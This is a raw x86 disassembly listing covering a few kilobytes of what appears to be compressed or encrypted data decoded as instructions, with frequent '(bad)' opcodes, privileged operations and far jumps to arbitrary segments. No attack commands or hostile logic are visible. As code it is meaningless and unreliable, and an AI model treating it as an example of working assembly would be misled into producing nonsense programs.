  42e82e:	sar    BYTE PTR [eax],cl
  42e830:	jae    0x42e861
  42e832:	std    
  42e833:	pop    esi
  42e834:	sub    BYTE PTR [eax+eax*4-0x5f0e953d],bl
  42e83b:	add    BYTE PTR es:[esi-0x46],cl
  42e83f:	outs   dx,DWORD PTR ds:[esi]
  42e840:	(bad)  
  42e841:	xchg   esi,eax
  42e842:	jae    0x42e82c
  42e844:	jbe    0x42e7e1
  42e846:	adc    DWORD PTR [eax+0xf],esp
  42e849:	inc    esp
  42e84a:	inc    edx
  42e84b:	cli    
  42e84c:	imul   cx,WORD PTR [ebx-0x48],0xdfb
  42e852:	dec    ebp
  42e853:	fnstenv [ebx+0x52]
  42e856:	push   ebx
  42e857:	add    al,0xf2
  42e859:	ss pop ebp
  42e85b:	sub    BYTE PTR [edi-0x6f],0x47
  42e85f:	or     eax,0x407ca46
  42e864:	add    al,0x64
  42e866:	inc    ebx
  42e867:	push   ss
  42e868:	scas   eax,DWORD PTR es:[edi]
  42e869:	pop    edi
  42e86a:	loop   0x42e811
  42e86c:	(bad)  
  42e86d:	sti    
  42e86e:	jl     0x42e83e
  42e870:	jbe    0x42e808
  42e872:	lods   al,BYTE PTR ds:[esi]
  42e873:	cs inc edi
  42e875:	adc    DWORD PTR [ebx+edx*2],ecx
  42e878:	(bad)  
  42e879:	shl    al,1
  42e87b:	inc    esp
  42e87c:	pop    es
  42e87d:	hlt    
  42e87e:	imul   esi,DWORD PTR [ecx],0x6c
  42e881:	icebp  
  42e882:	pop    ebx
  42e883:	push   0x48
  42e885:	fsub   QWORD PTR [ebp-0x4a6bf87a]
  42e88b:	sub    al,0x45
  42e88d:	sub    BYTE PTR [ecx-0x74253947],cl
  42e893:	cli    
  42e894:	dec    esp
  42e895:	or     esp,edi
  42e897:	mov    al,ds:0xefca0f28
  42e89c:	mov    esi,0x363767e3
  42e8a1:	adc    al,0x5e
  42e8a3:	sub    eax,0x3289456b
  42e8a8:	fcmovnb st,st(5)
  42e8aa:	in     al,dx
  42e8ab:	mul    DWORD PTR [ebx]
  42e8ad:	mov    edi,0xb557b05
  42e8b2:	push   esi
  42e8b3:	mov    edi,0xfb68def7
  42e8b8:	retf   0x6b
  42e8bb:	loop   0x42e83f
  42e8bd:	call   0x0:0x14cb192e
	...
  42e934:	stc    
  42e935:	mov    cl,0x70
  42e937:	dec    eax
  42e938:	js     0x42e903
  42e93a:	stc    
  42e93b:	mov    cl,0x3
  42e93d:	push   ds
  42e93e:	nop
  42e93f:	aad    0xd6
  42e941:	sbb    BYTE PTR [ebp-0x1c],0xd8
  42e945:	in     al,dx
  42e946:	add    DWORD PTR [eax],eax
  42e948:	test   BYTE PTR [eax],0x0
  42e94b:	add    BYTE PTR [ebx+0x18],dl
  42e94e:	fsubr  QWORD PTR [edi-0xf]
  42e951:	jb     0x42e989
  42e953:	out    dx,al
  42e954:	lods   al,BYTE PTR ds:[esi]
  42e955:	inc    ecx
  42e956:	dec    ebx
  42e957:	lock jp 0x42e8f1
  42e95a:	(bad)  
  42e95c:	xor    ecx,0xffffff92
  42e95f:	pop    edi
  42e960:	fsin   
  42e962:	rdmsr  
  42e964:	ret    
  42e965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e966:	add    BYTE PTR [ebp-0x39fa863d],0xb6
  42e96d:	popa   
  42e96e:	or     eax,0x7f329fb1
  42e973:	mov    edi,DWORD PTR [esi+0x19]
  42e976:	jne    0x42e968
  42e978:	mov    edx,0x15657f82
  42e97d:	sub    cl,dl
  42e97f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e980:	aam    0xc4
  42e982:	shl    BYTE PTR [edi+edx*4-0x2892ce50],0x8e
  42e98a:	int    0xca
  42e98c:	jmp    0x45495e02
  42e991:	mov    ecx,ecx
  42e993:	scas   ax,WORD PTR es:[edi]
  42e995:	dec    eax
  42e996:	pop    edx
  42e997:	mov    ah,BYTE PTR [ebp+0x6ad9ece7]
  42e99d:	inc    ebx
  42e99e:	jge    0x42e922
  42e9a0:	ss mov al,0xeb
  42e9a3:	mov    esp,0x147f2a33
  42e9a8:	lods   eax,DWORD PTR ds:[esi]
  42e9a9:	es stc 
  42e9ab:	fsub   st(4),st
  42e9ad:	or     cl,BYTE PTR [edi+0x71]
  42e9b0:	popf   
  42e9b1:	jnp    0x42ea24
  42e9b3:	mov    dl,0xff
  42e9b5:	cmp    eax,0x73fdb284
  42e9ba:	mov    al,ds:0x147a2ed7
  42e9bf:	(bad)  
  42e9c1:	dec    edx
  42e9c2:	jbe    0xdfc26ece
  42e9c8:	jge    0x42e984
  42e9ca:	cmp    al,0xca
  42e9cc:	cs jmp 0x42ea28
  42e9cf:	jmp    0x42e99c
  42e9d1:	cmp    eax,0x422d6ffb
  42e9d6:	aas    
  42e9d7:	repz sub esp,DWORD PTR [edx+eax*4]
  42e9db:	iret   
  42e9dc:	jge    0x42e9f3
  42e9de:	sbb    al,0x3d
  42e9e0:	xor    eax,0xabdfc508
  42e9e5:	cmp    al,0xb1
  42e9e7:	aas    
  42e9e8:	sub    ebp,esi
  42e9ea:	sahf   
  42e9eb:	aam    0x24
  42e9ed:	fnstsw WORD PTR [esi]
  42e9ef:	retf   
  42e9f0:	mov    edx,0xbb19ef02
  42e9f5:	and    ebx,DWORD PTR [eax-0x74]
  42e9f8:	push   ebx
  42e9f9:	addr16 push ebx
  42e9fb:	(bad)  [ebx]
  42e9fd:	es push ss
  42e9ff:	jl     0x42e99b
  42ea01:	repnz dec eax
  42ea03:	stos   DWORD PTR es:[edi],eax
  42ea04:	call   0x278d:0xa1cb453c
  42ea0b:	xchg   edx,eax
  42ea0c:	mov    ebp,0xf32f42cb
  42ea11:	dec    esp
  42ea12:	add    bh,BYTE PTR [edx+0x4b]
  42ea15:	hlt    
  42ea16:	pusha  
  42ea17:	scas   al,BYTE PTR es:[edi]
  42ea18:	mov    ebx,0x3087d734
  42ea1d:	stc    
  42ea1e:	and    al,0xa8
  42ea20:	and    BYTE PTR [ecx+0x3f],0xec
  42ea24:	(bad)  
  42ea25:	cld    
  42ea26:	repz jns 0x42e9bc
  42ea29:	jbe    0x42e9b7
  42ea2b:	adc    al,0x7a
  42ea2d:	adc    BYTE PTR [edx],ch
  42ea2f:	aaa    
  42ea30:	mov    esi,0x949f432e
  42ea35:	int    0x33
  42ea37:	sub    bl,0x6f
  42ea3a:	jnp    0x42ea96
  42ea3c:	repz jae 0x42ea22
  42ea3f:	jbe    0x42e9c9
  42ea41:	jmp    0x0:0x0
	...
  42eab4:	mov    al,0x7a
  42eab6:	pop    ds
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	fild   QWORD PTR [ebp-0xd]
  42eabb:	dec    BYTE PTR [ebx]
  42eabd:	add    ah,BYTE PTR [ebp-0x48]
  42eac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eac1:	sub    edi,DWORD PTR [edx]
  42eac3:	ins    BYTE PTR es:[edi],dx
  42eac4:	into   
  42eac5:	in     eax,dx
  42eac6:	add    DWORD PTR [eax],eax
  42eac8:	test   BYTE PTR [eax],0x0
  42eacb:	add    BYTE PTR [edx+eiz*8+0x2c15f3ff],dl
  42ead2:	addr16 cld 
  42ead4:	adc    al,0x24
  42ead6:	mov    ebp,0xe98c943c
  42eadb:	mov    DWORD PTR [ecx],0xe98e8d90
  42eae1:	fld    DWORD PTR [ebx+edx*1+0xf4757d0]
  42eae8:	nop
  42eae9:	lock je 0x42ea6c
  42eaec:	adc    DWORD PTR [ebp+0x1342f64a],edi
  42eaf2:	dec    ecx
  42eaf3:	inc    edx
  42eaf4:	mov    ecx,0x1a54b351
  42eaf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eafa:	rol    BYTE PTR [eax],0xaa
  42eafd:	repnz call 0x5786:0x65a1492b
  42eb05:	aad    0x3
  42eb07:	aam    0x78
  42eb09:	mov    bl,0xae
  42eb0b:	iret   
  42eb0c:	xchg   bl,bh
  42eb0e:	push   cs
  42eb0f:	pop    esp
  42eb10:	scas   eax,DWORD PTR es:[edi]
  42eb11:	adc    ebx,DWORD PTR [edx+edx*8+0x69]
  42eb15:	jmp    0x42ead1
  42eb17:	test   BYTE PTR [ebx],0x2a
  42eb1a:	add    edx,DWORD PTR [ecx]
  42eb1c:	icebp  
  42eb1d:	push   es
  42eb1e:	add    bh,BYTE PTR ds:0x53742618
  42eb24:	or     eax,0x7a73be7f
  42eb29:	test   al,0x2
  42eb2b:	push   ecx
  42eb2c:	fmul   st,st(4)
  42eb2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb2f:	sar    bh,0x20
  42eb32:	mov    dh,0xf6
  42eb34:	push   ebx
  42eb35:	xchg   DWORD PTR [ecx-0x589084f0],esi
  42eb3b:	nop
  42eb3c:	mov    ebx,cs
  42eb3e:	dec    edi
  42eb3f:	cdq    
  42eb40:	and    ch,ch
  42eb42:	mov    al,ds:0xf0089c9
  42eb47:	fld    QWORD PTR [ebp-0x61]
  42eb4a:	ret    0xf922
  42eb4d:	dec    esp
  42eb4e:	(bad)  
  42eb50:	ret    
  42eb51:	xor    al,0xd7
  42eb53:	sbb    DWORD PTR [ecx-0x68f2abdc],ecx
  42eb59:	clc    
  42eb5a:	test   DWORD PTR [ebx-0x175fb173],eax
  42eb60:	and    DWORD PTR [esi+edi*1-0x3555aba5],ebp
  42eb67:	sbb    BYTE PTR [ecx+0x4d],dl
  42eb6a:	mov    DWORD PTR [ecx-0x3275d26a],esi
  42eb70:	cmp    edx,esp
  42eb72:	inc    ebp
  42eb73:	hlt    
  42eb74:	int3   
  42eb75:	icebp  
  42eb76:	fsub   QWORD PTR [esi-0x5b]
  42eb79:	and    bl,al
  42eb7b:	hlt    
  42eb7c:	adc    dh,BYTE PTR ds:0x6b961dc3
  42eb82:	inc    ecx
  42eb83:	mov    DWORD PTR [esi-0x6b139545],0xf4ecfd7e
  42eb8d:	mov    ecx,0xd0688974
  42eb92:	fldenv [ebx-0x1f]
  42eb95:	(bad)  
  42eb96:	fild   WORD PTR ds:0xfbb40ff3
  42eb9c:	cld    
  42eb9d:	jbe    0x42eb66
  42eb9f:	das    
  42eba0:	cmp    al,dh
  42eba2:	dec    edi
  42eba3:	push   ds
  42eba4:	pop    DWORD PTR [edi-0x13]
  42eba7:	out    dx,al
  42eba8:	loopne 0x42eb70
  42ebaa:	pop    esp
  42ebab:	lea    edi,[edi+0x1b0fdcd3]
  42ebb1:	jmp    0x18f1:0xa3c398c6
  42ebb8:	outs   dx,BYTE PTR gs:[esi]
  42ebba:	mov    ds:0x7fbb114a,eax
  42ebbf:	std    
  42ebc0:	push   ebp
  42ebc1:	add    BYTE PTR [eax],0x0
	...
  42ec34:	cmp    DWORD PTR [edi-0x2010f093],esi
  42ec3a:	jnp    0x42ebf3
  42ec3c:	sbb    cl,BYTE PTR [edi+edx*4+0x28497969]
  42ec43:	fs (bad) 
  42ec45:	out    dx,al
  42ec46:	add    DWORD PTR [eax],eax
  42ec48:	test   BYTE PTR [eax],0x0
  42ec4b:	add    BYTE PTR [ecx+eiz*2+0xddcd222],bh
  42ec52:	or     eax,0x3f738b48
  42ec57:	jnp    0x42ec8a
  42ec59:	dec    edi
  42ec5a:	inc    esp
  42ec5b:	xchg   ebx,eax
  42ec5c:	xchg   BYTE PTR [eax+0x4e],al
  42ec5f:	inc    eax
  42ec60:	pop    ebx
  42ec61:	lock push ss
  42ec63:	stos   BYTE PTR es:[edi],al
  42ec64:	xchg   edi,eax
  42ec65:	mov    bl,0x33
  42ec67:	xor    ah,BYTE PTR [ecx-0x3b]
  42ec6a:	inc    edx
  42ec6b:	pop    ebx
  42ec6c:	mov    dh,0x8c
  42ec6e:	in     al,dx
  42ec6f:	loope  0x42ec2a
  42ec71:	inc    edi
  42ec72:	js     0x42ecbd
  42ec74:	mov    edi,0xac45e8c9
  42ec79:	stc    
  42ec7a:	and    BYTE PTR [edx],0x1
  42ec7d:	fst    QWORD PTR [eax-0x5d337282]
  42ec83:	retf   
  42ec84:	ins    DWORD PTR es:[edi],dx
  42ec85:	mov    edx,0x270661f
  42ec8a:	pop    ds
  42ec8b:	loope  0x42ed06
  42ec8d:	add    BYTE PTR ds:0xfbf4a6ee,dl
  42ec93:	dec    ecx
  42ec94:	sar    BYTE PTR [ecx-0x2],1
  42ec97:	dec    edx
  42ec98:	inc    BYTE PTR [esi]
  42ec9a:	cli    
  42ec9b:	jns    0x42ec97
  42ec9d:	test   DWORD PTR [ebx-0xf326541],0x5505c647
  42eca7:	jb     0x42ed00
  42eca9:	pusha  
  42ecaa:	scas   eax,DWORD PTR es:[edi]
  42ecab:	add    al,0x9f
  42ecad:	enter  0xaa09,0xbd
  42ecb1:	sub    al,BYTE PTR [eax+0xa]
  42ecb4:	loope  0x42ecfe
  42ecb6:	add    eax,0x2c835a32
  42ecbb:	pop    ss
  42ecbc:	ins    BYTE PTR es:[edi],dx
  42ecbd:	jne    0x42ec80
  42ecbf:	or     DWORD PTR [eax+0x3a778635],ecx
  42ecc5:	mov    bh,0xf9
  42ecc7:	jg     0x42ecf6
  42ecc9:	push   ebx
  42ecca:	idiv   BYTE PTR [ecx+0x5e645ea2]
  42ecd0:	or     esp,edx
  42ecd2:	and    DWORD PTR [ebx],edi
  42ecd4:	or     DWORD PTR [ebx+ebx*4+0x4c],eax
  42ecd8:	lds    ecx,FWORD PTR [ebx+0x39a0c37a]
  42ecde:	scas   eax,DWORD PTR es:[edi]
  42ecdf:	sub    DWORD PTR [eax+0x3acafba0],esi
  42ece5:	sub    al,dl
  42ece7:	pop    ebp
  42ece8:	pop    ds
  42ece9:	(bad)  
  42ecea:	aam    0x32
  42ecec:	dec    edx
  42eced:	aam    0xf9
  42ecef:	mov    esp,0xa2c3160c
  42ecf4:	(bad)  
  42ecf6:	adc    bh,BYTE PTR [ebx-0x50f94680]
  42ecfc:	cmp    ebx,DWORD PTR [ebx]
  42ecfe:	in     al,dx
  42ecff:	sbb    ah,BYTE PTR ds:0xffa9f0e6
  42ed05:	xlat   BYTE PTR ds:[ebx]
  42ed06:	adc    eax,0xa429c45d
  42ed0b:	pop    esp
  42ed0c:	loopne 0x42ed8d
  42ed0e:	call   0xf5c0:0xced61c23
  42ed15:	in     eax,0x8d
  42ed17:	icebp  
  42ed18:	int3   
  42ed19:	(bad)  
  42ed1a:	mov    dh,0xa6
  42ed1c:	je     0x42ed84
  42ed1e:	and    esp,0x40f44488
  42ed24:	mov    bl,al
  42ed26:	leave  
  42ed27:	bound  edx,QWORD PTR [eax+0x1cf66657]
  42ed2d:	add    eax,0x66613280
  42ed32:	pop    ss
  42ed33:	loop   0x42ecde
  42ed35:	mov    edx,0xc0a39e71
  42ed3a:	sub    DWORD PTR [esi],0xcfd359ca
  42ed40:	pop    edi
  42ed41:	stos   BYTE PTR es:[edi],al
	...
  42edb2:	add    BYTE PTR [eax],al
  42edb4:	out    0x82,al
  42edb6:	lods   eax,DWORD PTR ds:[esi]
  42edb7:	xor    ebp,ebp
  42edb9:	aas    
  42edba:	(bad)  
  42edbb:	xlat   BYTE PTR ds:[ebx]
  42edbc:	jmp    0x42ed84
  42edbe:	popa   
  42edbf:	test   eax,0x6f72b35b
  42edc4:	mov    edx,0xf60001ef
  42edc9:	add    BYTE PTR [eax],al
  42edcb:	add    BYTE PTR [edx-0x41],ch
  42edce:	test   eax,0x301f76d4
  42edd3:	xlat   BYTE PTR ds:[ebx]
  42edd4:	jb     0x42ed67
  42edd6:	cdq    
  42edd7:	adc    DWORD PTR [ebx+0x65],esp
  42edda:	xchg   esp,eax
  42eddb:	jae    0x42ee05
  42eddd:	es xor eax,0xe08b86cd
  42ede3:	dec    eax
  42ede4:	fdiv   st,st(2)
  42ede6:	aam    0x44
  42ede8:	xor    eax,0x7c1283b4
  42eded:	mov    dl,0x3a
  42edef:	hlt    
  42edf0:	sbb    esp,ebx
  42edf2:	les    edx,FWORD PTR [ebx-0x3c4a7116]
  42edf8:	ror    BYTE PTR [eax-0x70e93b45],cl
  42edfe:	sub    esp,DWORD PTR ds:0xdd9ac773
  42ee04:	push   ecx
  42ee05:	mov    ebp,0x465a4730
  42ee0a:	inc    ebx
  42ee0b:	and    eax,0x3dadb93
  42ee10:	dec    ebp
  42ee11:	cmp    al,0xfd
  42ee13:	inc    esp
  42ee14:	test   BYTE PTR [edx],0xa6
  42ee17:	jl     0x42edc9
  42ee19:	mov    bh,0x7e
  42ee1b:	sub    al,0x66
  42ee1d:	call   DWORD PTR [edi]
  42ee1f:	inc    edx
  42ee20:	xor    DWORD PTR [ebx+ecx*4+0x53b9e93a],edx
  42ee27:	mov    cl,0xc0
  42ee29:	push   esp
  42ee2a:	mov    eax,ds:0x526f59bf
  42ee2f:	or     edi,0x2
  42ee32:	xchg   ebx,eax
  42ee33:	leave  
  42ee34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ee35:	sub    dl,bl
  42ee37:	lods   al,BYTE PTR ds:[esi]
  42ee38:	aaa    
  42ee39:	mov    cl,0x45
  42ee3b:	pusha  
  42ee3c:	xchg   DWORD PTR [eax-0x2f90bdb4],ebx
  42ee42:	mov    bl,0x25
  42ee44:	stos   BYTE PTR es:[edi],al
  42ee45:	pop    eax
  42ee46:	pop    edx
  42ee47:	and    BYTE PTR [eax-0x74103799],bl
  42ee4d:	leave  
  42ee4e:	jg     0x42edfb
  42ee50:	jo     0x42ede4
  42ee52:	cmc    
  42ee53:	inc    esp
  42ee54:	inc    esp
  42ee55:	call   0x206c83e1
  42ee5a:	loope  0x42ee00
  42ee5c:	ins    DWORD PTR es:[edi],dx
  42ee5d:	or     DWORD PTR [edx+0xcf007b6],eax
  42ee63:	dec    eax
  42ee64:	cli    
  42ee65:	add    al,0xae
  42ee67:	inc    esp
  42ee68:	call   0x50f:0x406dc261
  42ee6f:	xor    al,0x72
  42ee71:	lea    ebx,[edi]
  42ee73:	sub    DWORD PTR ds:0x89640f07,0xffffffd9
  42ee7a:	adc    edi,ecx
  42ee7c:	test   BYTE PTR [ebx+0x446e4ca6],ah
  42ee82:	lar    esi,WORD PTR [eax-0x41]
  42ee86:	xor    ebp,0xf9c1d73b
  42ee8c:	out    dx,eax
  42ee8d:	pop    ecx
  42ee8e:	xor    DWORD PTR [ecx-0x6590b3a3],ecx
  42ee94:	nop
  42ee95:	test   eax,0x83b39967
  42ee9a:	cmp    ch,bl
  42ee9c:	sbb    al,0xf1
  42ee9e:	cli    
  42ee9f:	dec    ecx
  42eea0:	mov    ds:0xe9c8699d,eax
  42eea5:	cmp    esi,DWORD PTR ds:0x251f0a88
  42eeab:	imul   ecx,DWORD PTR [eax+0xbccc8d6],0x22d1becc
  42eeb5:	and    eax,0x737be3a1
  42eeba:	lea    eax,[ebp+edx*1-0x4c]
  42eebe:	add    DWORD PTR [eax+0x60],ebx
  42eec1:	sub    al,0x0
	...
  42ef33:	add    BYTE PTR [edx],al
  42ef35:	(bad)  
  42ef36:	jb     0x42eede
  42ef38:	(bad)  
  42ef39:	scas   al,BYTE PTR es:[edi]
  42ef3a:	(bad)  
  42ef3b:	(bad)  
  42ef3c:	cmp    DWORD PTR [edi],edi
  42ef3e:	int3   
  42ef3f:	repnz push 0x66
  42ef42:	push   cs
  42ef43:	add    esi,DWORD PTR [eax-0x9fffe10]
  42ef49:	add    BYTE PTR [eax],al
  42ef4b:	add    BYTE PTR [esi],al
  42ef4d:	and    DWORD PTR [edx-0x2b821c1d],0xd3133ce2
  42ef57:	ficomp DWORD PTR [ebx-0x7a5e6c0e]
  42ef5d:	shr    DWORD PTR [eax+0x6fa355db],cl
  42ef63:	jmp    0x310b68fe
  42ef68:	inc    esp
  42ef69:	sub    al,0x1c
  42ef6c:	and    al,0x60
  42ef6e:	lock or DWORD PTR [ebx-0x2fffa7e6],edx
  42ef75:	hlt    
  42ef76:	mov    esi,0x98450809
  42ef7b:	xchg   esp,eax
  42ef7c:	out    dx,eax
  42ef7d:	lahf   
  42ef7e:	jmp    0x42ef02
  42ef80:	addr16 pop ebx
  42ef82:	add    DWORD PTR [ebp-0x730fc5aa],ebp
  42ef88:	xor    DWORD PTR [eax],edi
  42ef8a:	jecxz  0x42efbe
  42ef8c:	push   0xffffffd8
  42ef8e:	lahf   
  42ef8f:	sub    ebp,edi
  42ef91:	adc    al,0xe7
  42ef93:	mov    eax,ds:0xc95bc37e
  42ef98:	fstp   QWORD PTR [eax+0x15]
  42ef9b:	es (bad) 
  42ef9d:	in     eax,0x30
  42ef9f:	sbb    ecx,DWORD PTR [ebx-0x65f5909b]
  42efa5:	push   0xa4c9c552
  42efaa:	or     al,0xe9
  42efac:	pop    edx
  42efad:	sbb    ebp,DWORD PTR [esi]
  42efaf:	test   al,0xf1
  42efb1:	mov    eax,ds:0xc9e8a5a8
  42efb6:	pop    es
  42efb7:	pop    ebx
  42efb8:	pop    ds
  42efb9:	stc    
  42efba:	stos   DWORD PTR es:[edi],eax
  42efbb:	push   edi
  42efbc:	(bad)  
  42efbd:	sub    BYTE PTR [ecx+0x6a],ch
  42efc0:	mov    esi,edx
  42efc2:	addr16 jbe 0x42ef7c
  42efc5:	add    al,ah
  42efc7:	jnp    0x42efe2
  42efc9:	xchg   esi,eax
  42efca:	add    bl,BYTE PTR [ecx]
  42efcc:	mov    ah,0x52
  42efce:	add    ch,BYTE PTR [ebp+0x5667b6f5]
  42efd4:	xchg   edx,eax
  42efd5:	add    ebp,DWORD PTR [eax]
  42efd7:	pop    edi
  42efd8:	pop    eax
  42efd9:	dec    edx
  42efda:	push   edx
  42efdb:	sbb    DWORD PTR [ebx-0x2d],0xffffffad
  42efdf:	or     BYTE PTR [ebx],bl
  42efe1:	shl    DWORD PTR [ecx-0x6285425c],1
  42efe7:	test   eax,0x53a70060
  42efec:	rol    BYTE PTR [esi],0xa5
  42efef:	mov    esp,DWORD PTR [ebx-0x50]
  42eff2:	iret   
  42eff3:	push   ss
  42eff4:	or     eax,0x358b84d3
  42eff9:	inc    DWORD PTR [ecx]
  42effb:	retf   0x3e6e
  42effe:	mov    ds:0xf114f3ff,eax
  42f004:	pop    eax
  42f005:	in     al,dx
  42f006:	fisubr DWORD PTR [edi-0x253cafa6]
  42f00c:	and    ch,bh
  42f00e:	or     ecx,eax
  42f010:	fisttp WORD PTR [ebx+eax*8]
  42f013:	xchg   ecx,eax
  42f014:	mov    bl,0x2a
  42f016:	fcom   st(7)
  42f018:	test   BYTE PTR [esi-0x21],ch
  42f01b:	fsubr  DWORD PTR [ecx-0x42]
  42f01e:	sub    eax,0x9895cae3
  42f023:	add    al,0x50
  42f025:	es int3 
  42f027:	jg     0x42f016
  42f029:	inc    ebx
  42f02a:	cmc    
  42f02b:	leave  
  42f02c:	mov    cs,WORD PTR [ebx]
  42f02e:	sbb    al,0x12
  42f030:	test   ebx,edx
  42f032:	jb     0x42efbf
  42f034:	push   0x285b54fe
  42f039:	sub    edx,DWORD PTR [ebx]
  42f03b:	mov    BYTE PTR [edi-0x6769de54],cl
  42f041:	add    BYTE PTR [eax],0x0
	...
  42f0b4:	mov    eax,ds:0x7e061ecf
  42f0b9:	xlat   BYTE PTR ds:[ebx]
  42f0ba:	mov    ecx,0xd7e009ef
  42f0bf:	bound  edx,QWORD PTR [edi+ebp*8]
  42f0c2:	jnp    0x42f09c
  42f0c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0c5:	icebp  
  42f0c6:	add    DWORD PTR [eax],eax
  42f0c8:	test   BYTE PTR [eax],0x0
  42f0cb:	add    BYTE PTR [edi-0x36],al
  42f0ce:	xchg   ebx,eax
  42f0cf:	xchg   esp,eax
  42f0d0:	pop    ebx
  42f0d1:	push   gs
  42f0d3:	out    0x29,eax
  42f0d5:	push   0x5a
  42f0d7:	scas   eax,DWORD PTR es:[edi]
  42f0d8:	(bad)  
  42f0d9:	xor    DWORD PTR [ebp+esi*4+0x17],ebx
  42f0dd:	inc    ebx
  42f0de:	call   0x1b13:0x707545dd
  42f0e5:	sbb    BYTE PTR [edx+edx*8+0x2115c404],al
  42f0ec:	sbb    ebx,0xffffffae
  42f0ef:	int    0x5
  42f0f1:	mov    ecx,gs
  42f0f3:	test   al,0x55
  42f0f5:	test   al,0x46
  42f0f7:	fadd   QWORD PTR [ecx]
  42f0f9:	cs push edi
  42f0fb:	sub    ebp,DWORD PTR [ecx-0x55]
  42f0fe:	dec    ebx
  42f0ff:	xchg   DWORD PTR [esi],esi
  42f101:	adc    al,0xeb
  42f103:	mov    ebx,edi
  42f105:	mov    dl,0xda
  42f107:	add    BYTE PTR [esi+0x4],bl
  42f10a:	mov    ds:0x3c263e8a,al
  42f10f:	fcmovbe st,st(3)
  42f111:	(bad)
  42f115:	in     al,0x90
  42f117:	lods   eax,DWORD PTR ds:[esi]
  42f118:	cmp    bl,cl
  42f11a:	mov    bl,0xd5
  42f11c:	pusha  
  42f11d:	jl     0x42f0a8
  42f11f:	not    BYTE PTR [ecx]
  42f121:	daa    
  42f122:	dec    esi
  42f123:	pop    ecx
  42f124:	pop    ss
  42f125:	out    0x21,al
  42f127:	mov    ebp,edx
  42f129:	sbb    ebp,DWORD PTR [edi+ebp*1]
  42f12c:	outs   dx,DWORD PTR ds:[esi]
  42f12d:	(bad)  
  42f12e:	test   DWORD PTR [edx+0x6f30ca99],0x37e8abeb
  42f138:	push   ecx
  42f139:	sbb    bl,BYTE PTR [edx]
  42f13b:	mov    eax,ds:0xa2444218
  42f140:	imul   esp,edi,0xffffff97
  42f143:	adc    eax,0xa76661c5
  42f148:	test   ecx,edx
  42f14a:	xchg   ebp,eax
  42f14b:	retf   
  42f14c:	sub    eax,0xd7bbd904
  42f151:	mov    WORD PTR [eax],bp
  42f154:	rcl    BYTE PTR [ebp-0x10],cl
  42f157:	test   eax,0xf1941c88
  42f15c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f15d:	push   0x3d92bf1a
  42f162:	xor    esi,DWORD PTR [ebx+0x63]
  42f165:	std    
  42f166:	push   ss
  42f167:	inc    esp
  42f168:	and    BYTE PTR [esi+0x2e],dl
  42f16b:	or     esp,ebx
  42f16d:	vaddsubps ymm7,ymm7,YMMWORD PTR [edx+esi*4-0x21]
  42f173:	outs   dx,DWORD PTR ds:[esi]
  42f174:	out    dx,eax
  42f175:	inc    esp
  42f176:	in     al,0x6a
  42f178:	push   edi
  42f179:	add    BYTE PTR [edi],0xcf
  42f17c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f17d:	sbb    DWORD PTR [ebx-0x15],ebx
  42f180:	jmp    0x1ec1:0x73c5d232
  42f187:	in     eax,dx
  42f188:	ja     0x42f144
  42f18a:	push   esp
  42f18b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f18c:	dec    eax
  42f18d:	inc    edi
  42f18f:	pusha  
  42f190:	push   esi
  42f191:	test   DWORD PTR ds:0xcf95be24,0xbe743ac5
  42f19b:	jp     0x42f1c8
  42f19d:	mov    WORD PTR [ecx-0x5a55d9e],?
  42f1a3:	push   ebx
  42f1a4:	repnz fucomi st,st(4)
  42f1a7:	and    DWORD PTR [edx+0x49b70a8e],edi
  42f1ad:	sbb    BYTE PTR [ecx-0x4a],bl
  42f1b0:	not    DWORD PTR [ecx-0x17]
  42f1b3:	mov    al,0xee
  42f1b5:	inc    edi
  42f1b6:	push   es
  42f1b7:	add    ch,BYTE PTR [ebx+0xd604d1f]
  42f1bd:	fcom   st(4)
  42f1bf:	repz cdq 
  42f1c1:	rol    BYTE PTR [eax],1
	...
  42f233:	add    BYTE PTR [ebp-0x655875c3],ch
  42f239:	mov    bh,0xad
  42f23b:	aas    
  42f23c:	jp     0x42f245
  42f23e:	int3   
  42f23f:	icebp  
  42f240:	inc    ebp
  42f241:	adc    BYTE PTR [esi+eiz*8-0x64],0xf2
  42f246:	add    DWORD PTR [eax],eax
  42f248:	test   BYTE PTR [eax],0x0
  42f24b:	add    BYTE PTR [edi+0x40bbbd04],al
  42f251:	ror    ch,0x58
  42f254:	out    dx,eax
  42f255:	cmp    al,BYTE PTR [esi]
  42f257:	cdq    
  42f258:	xchg   di,ax
  42f25a:	test   DWORD PTR [ebx+ebx*2+0x69465b3d],esp
  42f261:	xor    dh,cl
  42f263:	mov    ch,0x11
  42f265:	in     al,0xf0
  42f267:	jne    0x42f20e
  42f269:	mov    dh,0x96
  42f26b:	out    dx,eax
  42f26c:	in     al,dx
  42f26d:	sbb    eax,0x71a5c344
  42f272:	push   cs
  42f273:	ficomp WORD PTR [ebp-0x5f]
  42f276:	loop   0x42f2ec
  42f278:	sbb    al,0xd0
  42f27a:	or     BYTE PTR [ebp+0x6ca5c414],ch
  42f280:	rcl    DWORD PTR [edi+0x3102b4bc],cl
  42f286:	leave  
  42f287:	mov    ds:0xf62fe76e,al
  42f28c:	test   eax,0x38f3
  42f291:	xor    al,0x9d
  42f293:	xchg   esp,eax
  42f294:	aad    0x72
  42f296:	aad    0x55
  42f298:	xor    eax,0x25d84c8a
  42f29d:	pop    es
  42f29e:	pop    ebx
  42f29f:	fild   DWORD PTR ds:0x7c8cacee
  42f2a5:	sbb    al,0xcb
  42f2a7:	loope  0x42f2e5
  42f2a9:	and    DWORD PTR [edi],ecx
  42f2ab:	rcl    BYTE PTR [ecx+edx*8],1
  42f2ae:	xor    BYTE PTR [ebp+esi*1-0x6902f588],ch
  42f2b5:	stc    
  42f2b6:	xor    cl,bl
  42f2b8:	xchg   BYTE PTR [esi],bh
  42f2ba:	stos   DWORD PTR es:[edi],eax
  42f2bb:	test   eax,0x4bf0a6a8
  42f2c0:	loop   0x42f337
  42f2c2:	inc    ecx
  42f2c3:	in     al,0x3f
